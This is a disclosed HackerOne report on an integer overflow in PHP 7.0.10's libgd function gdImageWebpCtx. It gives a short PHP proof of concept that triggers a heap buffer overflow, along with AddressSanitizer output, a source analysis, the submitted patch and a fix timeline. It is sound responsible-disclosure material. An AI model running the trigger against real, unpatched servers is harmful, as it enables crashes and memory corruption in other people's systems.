# PHP Integer Overflow in gdImageWebpCtx

## Report Details
- **Report ID**: 170619
- **URL**: https://hackerone.com/reports/170619
- **State**: Closed
- **Severity**: low
- **Submitted**: 2016-09-20T02:47:07.185Z
- **Disclosed**: 2020-10-10T01:50:05.408Z

## Reporter
- **Username**: binvul
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ibb

## Vulnerability Information
# PHP Integer Overflow in gdImageWebpCtx

## 1. Affected Version
+ PHP 7.0.10

## 2. Credit
This vulnerability was discovered by Ke Liu of Tencent's Xuanwu LAB.

## 3. Testing Environments
+ **OS**: Ubuntu
+ **PHP**: [7.0.10](http://php.net/distributions/php-7.0.10.tar.gz)
+ **Compiler**: Clang
+ **CFLAGS**: ``-g -O0 -fsanitize=address``

## 4. PoC

```
<?php
    ini_set('memory_limit', -1);
    $im = imagecreatetruecolor(0x8000, 0x8001);
    imagewebp($im, 'php.webp');
    imagedestroy($im);
?>
```

## 5. Vulnerability Details

AddressSanitizer output the following exception information.

```
==2583==ERROR: AddressSanitizer: heap-buffer-overflow on address
0x7ff13d43e800 at pc 0x000000a77d0d bp 0x7ffe8ecdae90 sp 0x7ffe8ecdae88
WRITE of size 1 at 0x7ff13d43e800 thread T0
    #0 0xa77d0c in gdImageWebpCtx /php_src/ext/gd/libgd/gd_webp.c:139:4
    #1 0x9c0aac in _php_image_output_ctx /php_src/ext/gd/gd_ctx.c:175:6
    #2 0x9aab7d in zif_imagewebp /php_src/ext/gd/gd.c:2690:2
    #3 0x2655967 in ZEND_DO_ICALL_SPEC_RETVAL_UNUSED_HANDLER /php_src/Zend/zend_vm_execute.h:628:2
    #4 0x20399e0 in execute_ex /php_src/Zend/zend_vm_execute.h:432:7
    #5 0x203f75a in zend_execute /php_src/Zend/zend_vm_execute.h:474:2
    #6 0x1b41033 in zend_execute_scripts /php_src/Zend/zend.c:1464:4
    #7 0x160a813 in php_execute_script /php_src/main/main.c:2537:14
    #8 0x2babd79 in do_cli /php_src/sapi/cli/php_cli.c:990:5
    #9 0x2ba4f0d in main /php_src/sapi/cli/php_cli.c:1378:18
    #10 0x7ff25026ff44 in __libc_start_main /build/eglibc-oGUzwX/eglibc-2.19/csu/libc-start.c:287:0
    #11 0x469856 in _start ??:0:0

0x7ff13d43e800 is located 0 bytes to the right of 131072-byte region [0x7ff13d41e800,0x7ff13d43e800)
allocated by thread T0 here:
    #0 0x4f0812 in malloc ??:0:0
    #1 0x18e6886 in _emalloc /php_src/Zend/zend_alloc.c:2402:11
    #2 0xa774b0 in gdImageWebpCtx /php_src/ext/gd/libgd/gd_webp.c:123:20
    #3 0x9c0aac in _php_image_output_ctx /php_src/ext/gd/gd_ctx.c:175:6
    #4 0x9aab7d in zif_imagewebp /php_src/ext/gd/gd.c:2690:2
    #5 0x2655967 in ZEND_DO_ICALL_SPEC_RETVAL_UNUSED_HANDLER /php_src/Zend/zend_vm_execute.h:628:2
    #6 0x20399e0 in execute_ex /php_src/Zend/zend_vm_execute.h:432:7
    #7 0x203f75a in zend_execute /php_src/Zend/zend_vm_execute.h:474:2
    #8 0x1b41033 in zend_execute_scripts /php_src/Zend/zend.c:1464:4
    #9 0x160a813 in php_execute_script /php_src/main/main.c:2537:14
    #10 0x2babd79 in do_cli /php_src/sapi/cli/php_cli.c:990:5
    #11 0x2ba4f0d in main /php_src/sapi/cli/php_cli.c:1378:18
    #12 0x7ff25026ff44 in __libc_start_main /build/eglibc-oGUzwX/eglibc-2.19/csu/libc-start.c:287:0

SUMMARY: AddressSanitizer: heap-buffer-overflow ??:0 ??
Shadow bytes around the buggy address:
  0x0ffea7a7fcb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0ffea7a7fcc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0ffea7a7fcd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0ffea7a7fce0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x0ffea7a7fcf0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0ffea7a7fd00:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0ffea7a7fd10: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0ffea7a7fd20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0ffea7a7fd30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0ffea7a7fd40: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0ffea7a7fd50: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Heap right redzone:      fb
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack partial redzone:   f4
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==2583==ABORTING
```

# 6. Source Code Analysis
This is an **integer overflow** issue which could lead to **heap buffer overflow (out-of-bounds write)** circumstances. The bad code lies in function ``gdImageWebpCtx`` of file ``gd_webp.c``. At line 123 we can see the following code.

```
argb = (uint8_t *)gdMalloc(gdImageSX(im) * 4 * gdImageSY(im));  // integer overflow!!!
```

There is no overflow check before calling the ``gdMalloc`` function. Actually, an **integer overflow** can be happened here. For example, ``0x8000 * 0x8001 * 4 = 0x100020000 -> Overflow -> 0x20000``. The buffer will be overflowed in the following ``for`` loop.

```
for (y = 0; y < gdImageSY(im); y++) {
    for (x = 0; x < gdImageSX(im); x++) {
        register int c;
        register char a;
        c = im->tpixels[y][x];
        a = gdTrueColorGetAlpha(c);
        if (a == 127) {
            a = 0;
        } else {
            a = 255 - ((a << 1) + (a >> 6));
        }
        *(p++) = gdTrueColorGetRed(c);    // heap buffer overflow!!!
        *(p++) = gdTrueColorGetGreen(c);  // heap buffer overflow!!!
        *(p++) = gdTrueColorGetBlue(c);   // heap buffer overflow!!!
        *(p++) = a;    // heap buffer overflow!!!
    }
}
```

## 7. Patch
I wrote a patch for this issue and submitted it to PHP and libgd.

```
if (overflow2(gdImageSX(im), 4)) {
    return ;
}

if (overflow2(gdImageSX(im) * 4, gdImageSY(im))) {
    return ;
}
```

## 8. Timeline
+ 2016.09.02 - Found
+ 2016.09.02 - Reported to PHP via [73003](https://bugs.php.net/bug.php?id=73003)
+ 2016.09.06 - Reported to libgd and supplied a patch [libgd/pull/296](https://github.com/libgd/libgd/pull/296)
+ 2016.09.06 - Supplied a patch for PHP [php-src/pull/2119](https://github.com/php/php-src/pull/2119)
+ 2016.09.16 - Fixed in libgd
+ 2016.09.16 - Fixed in PHP


## Attachments
No attachments
